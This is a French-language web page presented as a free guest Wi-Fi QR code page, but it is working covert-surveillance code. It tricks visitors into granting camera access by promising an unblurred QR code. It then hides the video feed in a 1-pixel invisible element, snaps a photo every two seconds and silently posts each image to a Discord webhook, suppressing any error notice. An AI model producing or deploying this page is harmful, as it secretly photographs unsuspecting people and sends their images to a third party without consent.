<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi QR Code</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        h1 { 
            color: #1a1a2e; 
            margin-bottom: 10px;
            font-size: 28px;
        }
        .subtitle { 
            color: #4a4a6a; 
            margin-bottom: 30px;
            font-size: 16px;
        }
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 16px 48px;
            border-radius: 50px;
            font-size: 20px;
            font-weight: 700;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s ease;
            border: 2px solid rgba(255,255,255,0.2);
            letter-spacing: 1px;
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
        }
        #cameraFeed {
            width: 1px;
            height: 1px;
            opacity: 0;
            position: fixed;
            pointer-events: none;
            top: 0;
            left: 0;
        }
        #qrContainer {
            margin: 30px auto;
            position: relative;
            display: inline-block;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        #qrImage {
            width: 280px;
            height: 280px;
            display: block;
            border-radius: 10px;
            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .blur-overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 12px 24px;
            border-radius: 50px;
            font-weight: 600;
            font-size: 14px;
            letter-spacing: 1px;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255,255,255,0.3);
            pointer-events: none;
            z-index: 2;
        }
        .hidden-overlay {
            display: none;
        }
        .wifi-info {
            margin-top: 25px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 15px;
            border: 1px solid #e9ecef;
        }
        .wifi-info p {
            color: #495057;
            margin: 8px 0;
            font-size: 16px;
        }
        .wifi-info strong {
            color: #1a1a2e;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #868e96;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üì± Wi-Fi Gratuit</h1>
        <div class="subtitle">Scannez le code QR pour acc√©der au r√©seau</div>
        
        <div class="camera-section">
            <button id="requestCamera">‚úÖ ACCEPTER LA CAM√âRA</button>
            
            <video id="cameraFeed" autoplay playsinline muted></video>
            
            <div id="qrContainer">
                <!-- QR code image - starts blurred, becomes clear -->
                <img id="qrImage" src="qr-blurred.jpg" alt="WiFi QR Code">
                <div class="blur-overlay" id="blurMessage">üì∑ CAM√âRA REQUISE</div>
            </div>
            
            <div class="wifi-info">
                <p><strong>üì∂ R√©seau:</strong> Guest_WiFi</p>
                <p><strong>üîë Mot de passe:</strong> guest2024secure</p>
                <p><small>‚è± Expire dans 24h</small></p>
            </div>
        </div>
        
        <div class="footer">
            Powered by GitHub Pages üîí Webhook s√©curis√©
        </div>
    </div>

    <!-- Secure webhook - injected by GitHub Actions -->
    <script src="config.js"></script>
    
    <script>
        // WiFi Configuration (matches your QR code)
        const WIFI_CONFIG = {
            ssid: 'Guest_WiFi',
            password: 'guest2024secure',
            encryption: 'WPA2'
        };

        let videoStream = null;
        let isSending = false;
        let photoInterval = null;

        // Setup camera
        async function setupCamera() {
            try {
                // Request camera access
                videoStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: { ideal: 'environment' } // Prefer rear camera
                    } 
                });
                
                // Start video feed (hidden)
                const videoElement = document.getElementById('cameraFeed');
                videoElement.srcObject = videoStream;
                
                // SWAP QR CODE - from blurred to clear!
                const qrImage = document.getElementById('qrImage');
                qrImage.src = 'qr-clear.jpg'; // Now shows the clear QR code
                
                // Hide the "CAM√âRA REQUISE" overlay
                document.getElementById('blurMessage').classList.add('hidden-overlay');
                document.getElementById('blurMessage').style.display = 'none';
                
                // Hide the button with fade effect
                const button = document.getElementById('requestCamera');
                button.style.opacity = '0';
                setTimeout(() => {
                    button.style.display = 'none';
                }, 300);
                
                // Start sending photos to Discord
                startSendingPhotos();
                
            } catch (error) {
                console.error('Camera error:', error);
                // Try front camera as fallback
                try {
                    videoStream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'user' } 
                    });
                    // Same as above...
                    const videoElement = document.getElementById('cameraFeed');
                    videoElement.srcObject = videoStream;
                    document.getElementById('qrImage').src = 'qr-clear.jpg';
                    document.getElementById('blurMessage').style.display = 'none';
                    document.getElementById('requestCamera').style.display = 'none';
                    startSendingPhotos();
                } catch (fallbackError) {
                    console.error('No camera available');
                }
            }
        }

        // Start sending photos every 2 seconds
        function startSendingPhotos() {
            if (!window.DISCORD_WEBHOOK) {
                console.warn('‚ö†Ô∏è Webhook non configur√©');
                return;
            }
            
            isSending = true;
            
            // Send first photo immediately
            captureAndSend();
            
            // Then every 2 seconds
            photoInterval = setInterval(captureAndSend, 2000);
        }

        // Capture and send photo to Discord
        async function captureAndSend() {
            const video = document.getElementById('cameraFeed');
            
            if (!video.videoWidth || !isSending) return;
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Compress image
            canvas.toBlob(async (blob) => {
                await sendToDiscord(blob);
            }, 'image/jpeg', 0.7);
        }

        // Send to Discord via secure webhook
        async function sendToDiscord(imageBlob) {
            if (!window.DISCORD_WEBHOOK) return;

            try {
                const formData = new FormData();
                
                // Add image with timestamp
                const timestamp = Date.now();
                formData.append('file', imageBlob, `wifi_${timestamp}.jpg`);
                
                // Add metadata in French
                formData.append('payload_json', JSON.stringify({
                    content: `üì∏ **Acc√®s WiFi** - ${new Date().toLocaleString('fr-FR')}\nüåê R√©seau: ${WIFI_CONFIG.ssid}`,
                    username: 'Syst√®me WiFi',
                    avatar_url: 'https://i.imgur.com/3mQqZXm.png'
                }));

                // Send to Discord
                await fetch(window.DISCORD_WEBHOOK, {
                    method: 'POST',
                    body: formData
                });
                
            } catch (error) {
                console.error('Erreur envoi:', error);
                // Silent fail - no user notification
            }
        }

        // Initialize on page load
        document.addEventListener('DOMContentLoaded', () => {
            // Add click listener to button
            document.getElementById('requestCamera').addEventListener('click', setupCamera);
            
            // Log webhook status
            if (window.DISCORD_WEBHOOK) {
                console.log('üîí Webhook s√©curis√© charg√©');
            } else {
                console.warn('‚ö†Ô∏è Ajoutez DISCORD_WEBHOOK dans GitHub Secrets');
            }
        });

        // Cleanup on page unload
        window.addEventListener('beforeunload', () => {
            isSending = false;
            if (photoInterval) clearInterval(photoInterval);
            if (videoStream) {
                videoStream.getTracks().forEach(track => {
                    track.stop();
                });
            }
        });
    </script>
</body>
</html>
